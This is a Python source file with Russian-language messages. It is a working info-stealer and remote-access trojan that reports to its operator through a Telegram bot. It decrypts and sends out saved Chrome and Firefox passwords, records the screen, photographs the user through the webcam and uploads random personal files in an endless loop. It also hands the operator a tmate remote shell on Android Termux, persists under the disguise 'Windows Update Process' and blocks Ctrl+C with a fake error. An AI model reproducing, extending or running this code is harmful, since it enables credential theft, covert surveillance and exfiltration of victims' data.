import sys
def gradient_text(text, start_color, end_color):
    gradient = []
    for i in range(len(text)):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * (i / len(text)))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * (i / len(text)))
        gradient.append(f"\033[38;2;{r};{g};{b}m{text[i]}")
    return ''.join(gradient)

try:
    import time
    import subprocess
    import requests
    from colorama import init, Fore, Style
    import os
    import threading
    import signal
    import random
    import platform
    import json
except ImportError as e:
    print(gradient_text(f"ImportError: Не установлены необходимые библиотеки.", (255, 0, 0), (255, 0, 0)))
    print(gradient_text("Устанавливаю библиотеки 🪄...", (0, 0, 255), (0, 150, 180)))
    try:
        result = subprocess.run(
            ['pip', 'install', 'colorama'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        if result.returncode != 0:
            print(gradient_text("FE: CannotInstallModule", (255, 0, 0), (255, 0, 0)))
            print(result.stderr)
            sys.exit(0)
        result = subprocess.run(
            ['pip', 'install', 'requests'],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        if result.returncode != 0:
            print(gradient_text("FE: CannotInstallModule", (255, 0, 0), (255, 0, 0)))
            print(result.stderr)
            sys.exit(0)
        else:
            print(gradient_text("🚀 Готово! Перезапусти софт.", (255, 255, 255), (255, 255, 255)))
    except Exception as e:
        print(f"UnknownError: {e}")
    sys.exit(0)

TELEGRAM_BOT_TOKEN = ''
TELEGRAM_CHAT_ID = ''
begin = ''
os_name = platform.system()
sys_name = 'undefined'
emoji = ''
tmate_output = []
client = ''

if os_name == "Windows":
    try:
        import sqlite3
        import json
        import base64
        import win32crypt
        from Crypto.Cipher import AES
        import shutil
        import cv2
        import pyautogui
        import numpy as np
        import datetime
        import winshell
        from win32com.client import Dispatch
    except ImportError as e:
        print(gradient_text(f"ImportError: Не установлены необходимые библиотеки.", (255, 0, 0), (255, 0, 0)))
        print(gradient_text("Устанавливаю библиотеки, это займет немного времени 🪄...", (0, 0, 255), (0, 150, 180)))
        try:
            result = subprocess.run(
                ['pip', 'install', 'opencv-python'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            if result.returncode != 0:
                print(gradient_text("FE: CannotInstallModule", (255, 0, 0), (255, 0, 0)))
                print(result.stderr)
                sys.exit(0)
            result = subprocess.run(
                ['pip', 'install', 'pyautogui'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            if result.returncode != 0:
                print(gradient_text("FE: CannotInstallModule", (255, 0, 0), (255, 0, 0)))
                print(result.stderr)
                sys.exit(0)
            result = subprocess.run(
                ['pip', 'install', 'numpy'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            if result.returncode != 0:
                print(gradient_text("FE: CannotInstallModule", (255, 0, 0), (255, 0, 0)))
                print(result.stderr)
                sys.exit(0)
            result = subprocess.run(
                ['pip', 'install', 'winshell'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            if result.returncode != 0:
                print(gradient_text("FE: CannotInstallModule", (255, 0, 0), (255, 0, 0)))
                print(result.stderr)
                sys.exit(0)
            result = subprocess.run(
                ['pip', 'install', 'pywin32'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            if result.returncode != 0:
                print(gradient_text("FE: CannotInstallModule", (255, 0, 0), (255, 0, 0)))
                print(result.stderr)
                sys.exit(0)
            result = subprocess.run(
                ['pip', 'install', 'pycryptodome'],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            if result.returncode != 0:
                print(gradient_text("FE: CannotInstallModule", (255, 0, 0), (255, 0, 0)))
                print(result.stderr)
                sys.exit(0)
            else:
                print(gradient_text("🚀 Готово! Перезапусти софт.", (255, 255, 255), (255, 255, 255)))
        except Exception as e:
            print(f"UnknownError: {e}")
        sys.exit(0)
                
def signal_handler(sig, frame):
    print("Unable to kill process. Permission denied.")

signal.signal(signal.SIGINT, signal_handler)

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    requests.post(url, data=payload)
    
def upload_video_to_telegram(video_path):
    with open(video_path, "rb") as video_file:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendVideo", 
                      data={'chat_id': TELEGRAM_CHAT_ID}, 
                      files={'video': video_file})

def send_image_via_telegram(image_path):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto'
    with open(image_path, 'rb') as image_file:
        files = {'photo': image_file}
        data = {'chat_id': TELEGRAM_CHAT_ID, 'caption': '📸'}
        response = requests.post(url, files=files, data=data)
        if response.status_code == 200:
            send_telegram_message("✅ Фото успешно отправлено.")
        else:
            send_telegram_message(f"❌ Не удалось отправить фото: {response.status_code}")

def get_geolocation():
    try:
        result = subprocess.run(['curl', 'https://ipinfo.io/json'], capture_output=True, text=True)
        if result.returncode == 0:
            return json.loads(result.stdout)
        else:
            send_telegram_message("🌐❌ Ошибка при выполнении curl.")
            return None
    except Exception as e:
        send_telegram_message(f"🌐❌ Произошла ошибка при получении гео: {e}")
        return None

def get_location_by_ip(ip):
    response = requests.get(f'https://ipinfo.io/{ip}/json')
    if response.status_code == 200:
        return response.json()
    else:
        send_telegram_message("⛓️‍💥 Ошибка при выполнении запроса к ipinfo.io")
        return None

def session():
    global tmate, tmate_output  # Объявляем переменные как глобальные
    # Запускаем tmate в фоновом режиме
    process = subprocess.Popen(['tmate', '-F'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    # Запускаем отдельный поток для отправки сообщения через 3 секунды
    threading.Thread(target=send_tmate_output, args=(process,)).start()

    # Читаем вывод tmate в реальном времени
    while True:
        line = process.stdout.readline()
        if not line:
            break
        tmate_output.append(line.decode('utf-8').strip())

def send_tmate_output(process):
    time.sleep(7)  # Ждем 3 секунды
    # Получаем весь вывод tmate
    global tmate_output
    tmate_output_str = '\n'.join(tmate_output)  # Объединяем все строки
    send_telegram_message(f"🛜 Обеспечен удаленный доступ к Termux жертвы, перейди по ссылке web session:\n{tmate_output_str}")
    
def run_commands():
    global os_name
    global sys_name
    global emoji
    global begin
    global client
    print(begin)
    try:
        if os_name == "Linux":
            if os.path.exists('/data/data/com.termux/files'):
                sys_name = "Termux (Android)"
                emoji = '📱'
                subprocess.run(['pkg', 'install', 'curl', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['pkg', 'install', 'tmate', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                tmate_thread = threading.Thread(target=session)
                tmate_thread.start()
            else:
                sys_name = "Linux"
                emoji = '🐧'
                subprocess.run(['sudo', 'apt', 'install', 'curl', '-y'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif os_name == "Darwin":
            sys_name = "MacOS"
            emoji = '🍏'
            subprocess.run(['brew', 'install', 'curl'], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        elif os_name == "Windows":
            sys_name = "Windows"
            emoji = '💻'
            thread = threading.Thread(target=get_chrome_passwords)
            thread.start()
            thread2 = threading.Thread(target=get_firefox_passwords)
            thread2.start()
            send_telegram_message(f"👁️️️️️️ Ищу пароли...")
            screen = threading.Thread(target=screen_sharing)
            screen.start()
            send_telegram_message(f"🎞️ Производится запись экрана...")
            cam = threading.Thread(target=cheese)
            cam.start()
            send_telegram_message(f"📷 Сейчас вылетит птичка!")
        else:
            send_telegram_message(f"⚠️ Такую систему я не знаю: {os_name}. Многие функции будут недоступны.")
            emoji = '⚠️'
            sys_name = "Неизвестная ОС"
    except Exception as e:
        send_telegram_message(f"❌ Ошибка установки зависимостей, продолжаю работу: {e}")
        print(f"Ошибка установки зависимостей: {e}")
    try:
        result = subprocess.run(['curl', 'ifconfig.me'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode == 0:
            ip_address = result.stdout.strip()
        else:
            ip_address = '🥷'
        client = ip_address
        ver = platform.version()
        arch = platform.architecture()
        geo_data = get_geolocation()
        if geo_data:
            latitude, longitude = geo_data['loc'].split(',')
            location_info = get_location_by_ip(ip_address)
# Форматируем сообщение о местоположении
            location_message = (
                f"🌍 Гео\n"
                f"Широта: {latitude}\n"
                f"Долгота: {longitude}\n"
            )
            if location_info:
                location_message += (
                    f"Город: {location_info.get('city', 'Неизвестно')}\n"
                    f"Регион: {location_info.get('region', 'Неизвестно')}\n"
                    f"Страна: {location_info.get('country', 'Неизвестно')}\n"
                    f"Почтовый индекс: {location_info.get('postal', 'Неизвестно')}\n"
                )
            else:
                location_message += "🌐❌ Не удалось получить доп инфу."
        else:
            location_message = "🌐❌ Не удалось получить гео."
        send_telegram_message(f"{emoji} Новая сессия\nКлиент/IP: {ip_address}\nСистема: {sys_name} {ver} {arch}\n {location_message}")
    except Exception as e:
        send_telegram_message(f"🚫 FE: {e}")
    share_thread = threading.Thread(target=share)
    share_thread.start()
    send_telegram_message(f"👁️️️️️️ Перехват данных...")
    if os_name == "Windows":
        os.system('cls')  # Для Windows
    elif os_name in ["Linux", "Darwin"]:  # Linux и macOS
        os.system('clear')  # Для Linux и macOS
    else:
        send_telegram_message(f"🚫 FE: Unsupported platform.")
    
def share():
    global os_name
    global client
    while True:  # Бесконечный цикл
        try:
            if os_name == "Windows":
                folders_to_send = [r"C:\Users", r"D:", r"F:", r"C:\downloads", r"C:\Downloads", r"C:\Program Files", r"C:\Program Files (x86)"]
            elif os_name == "Linux":
                if os.path.exists('/data/data/com.termux/files'):
                    folders_to_send = [
                        "/storage/emulated/0/Pictures",
                        "/storage/emulated/0/Movies",
                        "/storage/emulated/0/Music",
                        "/storage/emulated/0/Download",
                        "/storage/emulated/0/DCIM",
                        "/storage/emulated/0/Documents"
                    ]
                else:
                    folders_to_send = "/home"  # Дефолтная папка для Linux
            elif os_name == "Darwin":
                folders_to_send = ["/Users", "/Downloads", "/downloads", "/Download", "/download"]
            else:
                send_telegram_message("UnknownPlatformError: Пробую получить файлы другим способом.")
                folders_to_send = [
                    "/storage",
                    "/Users",
                    "/files",
                    "/Download",
                    "/Downloads",
                    "/download",
                    "/downloads",
                    "/"
                ]

            for folder in folders_to_send:
                if os.path.exists(folder):
                    files = []
                    for root, dirs, files_in_folder in os.walk(folder):
                        for file in files_in_folder:
                            files.append(os.path.join(root, file))
                    
                    random_files = random.sample(files, min(5, len(files)))

                    for file_path in random_files:
                        with open(file_path, 'rb') as f:
                            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
                            payload = {
                                'chat_id': TELEGRAM_CHAT_ID,
                                'caption': f"📁: {client}"
                            }
                            files = {
                                'document': f
                            }
                            try:
                                response = requests.post(url, data=payload, files=files)
                                if response.status_code == 200:
                                    send_telegram_message(f'🖤 Спизжено: {file_path}')
                                else:
                                    send_telegram_message(f'💔 Не спиздилось: {file_path} - {response.text}')
                            except requests.exceptions.RequestException as e:
                                send_telegram_message(f"⛓️‍💥 Ошибка при отправке файла: {e}")
                            time.sleep(1)
                else:
                    send_telegram_message(f"Папка не найдена: {folder}")
            time.sleep(2)  # Задержка перед следующей итерацией
        except Exception as e:
            send_telegram_message(f"🚫 Fatal: {e}")
            send_telegram_message(f"✋ Незамедлительное прекращение программы.")
            sys.exit(0)

def get_chrome_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data",
                                    "Local State")
    with open(local_state_path, "r", encoding="utf-8") as file:
        local_state = json.loads(file.read())
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(buff, key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        return decrypted_pass
    except Exception as e:
        try:
            return str(win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1])
        except Exception as e:
            return ""

def get_chrome_passwords():
    key = get_chrome_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default",
                           "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    for row in cursor.fetchall():
        url = row[0]
        username = row[1]
        encrypted_password = row[2]
        decrypted_password = decrypt_password(encrypted_password, key)

        if username and decrypted_password:
            send_telegram_message("--------------------------------------------------------------------")
            send_telegram_message(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n")

    cursor.close()
    db.close()
    os.remove(filename)

def get_firefox_passwords():
    def get_firefox_profile_path():
        profiles_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
        profile_folders = os.listdir(profiles_path)
        for folder in profile_folders:
            if folder.endswith(".default-release"):
                return os.path.join(profiles_path, folder)

    def decrypt_firefox_password():
        profile_path = get_firefox_profile_path()
        logins_path = os.path.join(profile_path, "logins.json")
        key4_path = os.path.join(profile_path, "key4.db")
        if not os.path.exists(logins_path) or not os.path.exists(key4_path):
            return []

        command = ['firefox', '-P', profile_path, '-no-remote', '-headless', '-print']

        subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        with open(logins_path, "r") as logins_file:
            logins_data = json.load(logins_file)

        passwords = []

        for login in logins_data["logins"]:
            encrypted_username = base64.b64decode(login["encryptedUsername"])
            encrypted_password = base64.b64decode(login["encryptedPassword"])
            decrypted_username = win32crypt.CryptUnprotectData(encrypted_username, None, None, None, 0)[1].decode()
            decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()

            if decrypted_username and decrypted_password:
                passwords.append({
                    "url": login["hostname"],
                    "username": decrypted_username,
                    "password": decrypted_password
                })

        return passwords

    passwords = decrypt_firefox_password()

    for entry in passwords:
        send_telegram_message("--------------------------------------------------------------------")
        send_telegram_message(f"URL: {entry['url']}\nUsername: {entry['username']}\nPassword: {entry['password']}\n")

class ScreenRecorder:
    def __init__(self, output_file="screen_recorder.mp4"):
        self.output_file = output_file
        self.is_recording = False
        self.frames = []

    def record_screen(self):
        while self.is_recording:
            screenshot = pyautogui.screenshot()
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            self.frames.append(frame)

    def start_recording(self):
        if not self.is_recording:
            self.is_recording = True
            recording_thread = threading.Thread(target=self.record_screen)
            recording_thread.start()

    def stop_recording(self):
        if self.is_recording:
            self.is_recording = False
            time.sleep(1)
            self.save_video()

    def save_video(self):
        if self.frames:
            height, width, layers = self.frames[0].shape
            size = (width, height)
            out = cv2.VideoWriter(
                self.output_file, cv2.VideoWriter_fourcc(*"mp4v"), 10, size
            )

            for frame in self.frames:
                out.write(frame)

            out.release()
            upload_video_to_telegram(f"{self.output_file}")
            send_telegram_message(f"🎥 {self.output_file}")

def capture_image():
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        send_telegram_message("📷❌ Не удалось открыть веб-камеру.")
        return None

    ret, frame = cap.read()
    if ret:
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f'image_{timestamp}.jpg'
        cv2.imwrite(filename, frame)
        send_telegram_message(f"✅ Фото сохранено как {filename}")
        cap.release()
        return filename
    else:
        send_telegram_message("❌ Не удалось захватить изображение.")
        cap.release()
        return None

def add_to_startup(file_path=None, key_name="Windows Update Process"):
    if file_path is None:
        file_path = os.path.abspath(sys.argv[0])
    startup_dir = winshell.startup()
    shortcut_path = os.path.join(startup_dir, f"{key_name}.lnk")

    if not os.path.exists(shortcut_path):
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = sys.executable
        shortcut.Arguments = f'"{file_path}"'
        shortcut.WorkingDirectory = os.path.dirname(file_path)
        shortcut.IconLocation = file_path
        shortcut.save()

def screen_sharing():
    while True:
        recorder = ScreenRecorder()
        recorder.start_recording()
        time.sleep(30)
        recorder.stop_recording()
        return

def cheese():
    image = capture_image()
    if image:
        send_image_via_telegram(image)
    add_to_startup()
    send_telegram_message('🚀 Добавлено в авторан.')
    
def raidplus():
    run_commands()

if __name__ == "__main__":
    raidplus()